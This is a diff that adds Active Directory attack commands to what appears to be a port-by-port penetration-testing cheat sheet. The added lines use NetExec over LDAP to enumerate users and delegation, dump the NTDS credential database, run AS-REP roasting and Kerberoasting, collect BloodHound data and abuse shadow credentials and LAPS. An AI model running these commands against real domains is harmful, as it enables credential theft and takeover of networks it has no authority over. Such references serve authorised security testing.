@@ -125,6 +125,20 @@
   `nmap -sV --script=ldap-rootdse,ldap-search <target> -p389`.  
   `enum4linux-ng <IP> -L -S -oJ output.json` -L: Get additional info via LDAP/LDAPS, -S: Get shares via RPC, -oJ: Outputs to file.  
   `windapsearch -d <domain> --dc <target> --module users` (install via `git clone https://github.com/ropnop/windapsearch`).
+Basic enum (users/trusts/delegation):  
+  `nxc ldap <dc> -u user -p pass --users`
+  `nxc ldap <dc> -u user -p pass --trusted-for-delegation`
+Dumps / attacks:  
+  `nxc ldap <dc> -u user -p pass --ntds`  
+  `nxc ldap <dc> -u user -p pass --asreproast hashes.asreproast`  
+  `nxc ldap <dc> -u user -p pass --kerberoasting hashes.kerb`
+BloodHound via LDAP:  
+  `nxc ldap <dc> -u user -p pass --bloodhound -c all`
+Common modules:  
+  `nxc ldap <dc> -u user -p pass -M shadow_credentials`  
+  `nxc ldap <dc> -u user -p pass -M laps -o computer=hostname`  
+  `nxc ldap <dc> -u user -p pass -M get-desc-users`  
+  `nxc ldap <dc> -u user -p pass -M groupmembership -o USER=username`
 
 - **443/TCP - HTTPS** (info disclosure, SSL misconfig, RCE via web vulns):  
   `curl -k -I https://<target>` (headers; pre-installed).  
